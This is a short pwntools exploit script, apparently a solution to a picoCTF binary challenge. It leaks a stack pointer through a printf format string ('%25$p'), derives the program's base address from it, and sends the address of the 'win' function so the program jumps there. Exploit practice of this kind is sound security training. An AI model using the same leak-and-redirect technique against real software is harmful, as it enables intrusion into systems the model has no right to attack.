from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./vuln")

def start():
    if args.REMOTE:
        return remote("rescued-float.picoctf.net", 61425)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)
context.log_level = 'error'
context.terminal = ['gnome-terminal', '-e']

"""
for i in range(1, 150):
    io = start()
    print(f"[+] Para {i}:")
    io.sendlineafter("Enter your name:", f"%{i}$p".encode())

    print(io.recvline().decode().strip())

    io.close()
"""

io = start()

io.sendlineafter("Enter your name:", f"%{25}$p".encode())

leak_var = int(io.recvline().decode().strip(), 16)

print(hex(leak_var))

elf.address =  leak_var - 0x1400

io.sendlineafter("enter the address to jump to, ex => 0x12345: ", hex(elf.sym.win))

print(hex(elf.sym.win))

io.interactive()


